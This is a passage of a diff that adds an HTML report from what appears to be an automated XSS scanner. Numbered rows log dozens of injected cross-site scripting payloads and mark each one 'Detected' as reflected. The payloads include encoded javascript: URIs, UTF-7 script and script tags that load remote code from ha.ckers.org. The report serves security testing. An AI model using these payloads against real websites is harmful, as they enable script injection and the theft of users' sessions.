+&lt;
+&lt;
+&lt;
+&lt;
+\x3c
+\x3C
+\u003c
+\u003C has been reflected verbatim...
+injecting payload &lt;IMG SRC=JaVaScRiPt:alert(&#39;XSS&#39;)&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>58</td>
+								<td>checking that vector &lt;IMG SRC=JaVaScRiPt:alert(&#39;XSS&#39;)&gt; has been reflected verbatim...
+injecting payload &lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>59</td>
+								<td>checking that vector &lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>60</td>
+								<td>injecting payload &lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#39;XSS&#39;&quot;)`&gt; in parameter text.
+checking that vector &lt;IMG SRC=`javascript:alert(&quot;RSnake says, &#39;XSS&#39;&quot;)`&gt; has been reflected verbatim...
+injecting payload &lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>61</td>
+								<td>checking that vector &lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; has been reflected verbatim...
+injecting payload &lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>62</td>
+								<td>checking that vector &lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt; has been reflected verbatim...
+injecting payload &lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>63</td>
+								<td>checking that vector &lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt; has been reflected verbatim...
+injecting payload &lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&#39;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&#39;\0029&quot;&gt; in parameter text.
+checking that vector &lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&#39;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&#39;\0029&quot;&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>64</td>
+								<td>injecting payload &lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>65</td>
+								<td>checking that vector &lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt; has been reflected verbatim...
+injecting payload &lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&#39;XSS&#39;);+ADw-/SCRIPT+AD4- in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>66</td>
+								<td>checking that vector &lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&#39;XSS&#39;);+ADw-/SCRIPT+AD4- has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>67</td>
+								<td>injecting payload \&quot;;alert(&#39;XSS&#39;);// in parameter text.
+checking that vector \&quot;;alert(&#39;XSS&#39;);// has been reflected verbatim...
+injecting payload &lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>68</td>
+								<td>checking that vector &lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt; has been reflected verbatim...
+injecting payload &lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>69</td>
+								<td>checking that vector &lt;STYLE&gt;@im\port&#39;\ja\vasc\ript:alert(&quot;XSS&quot;)&#39;;&lt;/STYLE&gt; has been reflected verbatim...
+injecting payload &lt;IMG SRC=&quot;jav	ascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>70</td>
+								<td>checking that vector &lt;IMG SRC=&quot;jav	ascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>71</td>
+								<td>injecting payload &lt;IMG SRC=&quot;jav	ascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+checking that vector &lt;IMG SRC=&quot;jav	ascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;IMG SRC=&quot;jav
+ascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>72</td>
+								<td>checking that vector &lt;IMG SRC=&quot;jav
+ascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>73</td>
+								<td>injecting payload &lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+checking that vector &lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;IMG
+SRC
+=
+&quot;
+j
+a
+v
+a
+s
+c
+r
+i
+p
+t
+:
+a
+l
+e
+r
+t
+(
+&#39;
+X
+S
+S
+&#39;
+)
+&quot;
+&gt;
+ in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>74</td>
+								<td>checking that vector &lt;IMG
+SRC
+=
+&quot;
+j
+a
+v
+a
+s
+c
+r
+i
+p
+t
+:
+a
+l
+e
+r
+t
+(
+&#39;
+X
+S
+S
+&#39;
+)
+&quot;
+&gt;
+ has been reflected verbatim...
+injecting payload perl -e &#39;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)&gt;&quot;;&#39;&gt; out in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>75</td>
+								<td>checking that vector perl -e &#39;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)&gt;&quot;;&#39;&gt; out has been reflected verbatim...
+injecting payload perl -e &#39;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&#39; &gt; out in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>76</td>
+								<td>checking that vector perl -e &#39;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&#39; &gt; out has been reflected verbatim...
+injecting payload &lt;IMG SRC=&quot;   javascript:alert(&#39;XSS&#39;);&quot;&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>77</td>
+								<td>checking that vector &lt;IMG SRC=&quot;   javascript:alert(&#39;XSS&#39;);&quot;&gt; has been reflected verbatim...
+injecting payload &lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>78</td>
+								<td>checking that vector &lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; has been reflected verbatim...
+injecting payload &lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>79</td>
+								<td>checking that vector &lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>80</td>
+								<td>injecting payload &lt;SCRIPT SRC=http://ha.ckers.org/xss.js in parameter text.
+checking that vector &lt;SCRIPT SRC=http://ha.ckers.org/xss.js has been reflected verbatim...
+injecting payload &lt;SCRIPT SRC=//ha.ckers.org/.j&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>81</td>
+								<td>checking that vector &lt;SCRIPT SRC=//ha.ckers.org/.j&gt; has been reflected verbatim...
+injecting payload &lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;)&quot; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>82</td>
+								<td>checking that vector &lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;)&quot; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>83</td>
+								<td>injecting payload &lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt; in parameter text.
+checking that vector &lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt; has been reflected verbatim...
+injecting payload &lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>84</td>
+								<td>checking that vector &lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>85</td>
+								<td>injecting payload &lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt; in parameter text.
+checking that vector &lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>86</td>
+								<td>injecting payload &lt;SCRIPT&gt;a=/XSS/
+alert(a.source)&lt;/SCRIPT&gt; in parameter text.
+checking that vector &lt;SCRIPT&gt;a=/XSS/
+alert(a.source)&lt;/SCRIPT&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>87</td>
+								<td>injecting payload &lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; in parameter text.
+checking that vector &lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>88</td>
+								<td>injecting payload &lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; in parameter text.
+checking that vector &lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>89</td>
+								<td>injecting payload &lt;SCRIPT a=&quot;blah&quot; &#39;&#39; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; in parameter text.
+checking that vector &lt;SCRIPT a=&quot;blah&quot; &#39;&#39; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; has been reflected verbatim...
+injecting payload &lt;SCRIPT &quot;a=&#39;&gt;&#39;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>90</td>
+								<td>checking that vector &lt;SCRIPT &quot;a=&#39;&gt;&#39;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; has been reflected verbatim...
+injecting payload &lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>91</td>
+								<td>checking that vector &lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; has been reflected verbatim...
+injecting payload &lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>92</td>
+								<td>checking that vector &lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; has been reflected verbatim...
+injecting payload &lt;SCRIPT a=&quot;&gt;&#39;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>93</td>
+								<td>checking that vector &lt;SCRIPT a=&quot;&gt;&#39;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt; has been reflected verbatim...
+injecting payload &lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>94</td>
+								<td>checking that vector &lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>95</td>
+								<td>injecting payload &lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt; in parameter text.
+checking that vector &lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>96</td>
+								<td>injecting payload &lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt; in parameter text.
+checking that vector &lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>97</td>
+								<td>injecting payload &lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt; in parameter text.
+checking that vector &lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+injecting payload &lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>98</td>
+								<td>checking that vector &lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+injecting payload &lt;A HREF=&quot;h
+tt	p://6	6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>99</td>
+								<td>checking that vector &lt;A HREF=&quot;h
+tt	p://6	6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>100</td>
+								<td>injecting payload &lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt; in parameter text.
+checking that vector &lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+injecting payload &lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>101</td>
+								<td>checking that vector &lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>102</td>
+								<td>injecting payload &lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt; in parameter text.
+checking that vector &lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>103</td>
+								<td>injecting payload &lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt; in parameter text.
+checking that vector &lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+injecting payload &lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>104</td>
+								<td>checking that vector &lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>105</td>
+								<td>injecting payload &lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt; in parameter text.
+checking that vector &lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+injecting payload &lt;A HREF=&quot;javascript:document.location=&#39;http://www.google.com/&#39;&quot;&gt;XSS&lt;/A&gt; in parameter text.
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+							<tr data-status="detected">
+								<td>106</td>
+								<td>checking that vector &lt;A HREF=&quot;javascript:document.location=&#39;http://www.google.com/&#39;&quot;&gt;XSS&lt;/A&gt; has been reflected verbatim...
+</td>
+								<td></td>
+								<td class="detected">Detected</td>
+							</tr>
+						</tbody>
+					</table>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+</body>
+
+<script src="assets/js/jquery-1.10.2.js" type="text/javascript"></script>
+<script src="assets/js/bootstrap.min.js" type="text/javascript"></script>
+<script src="assets/js/light-bootstrap-dashboard.js"></script>
+</html>
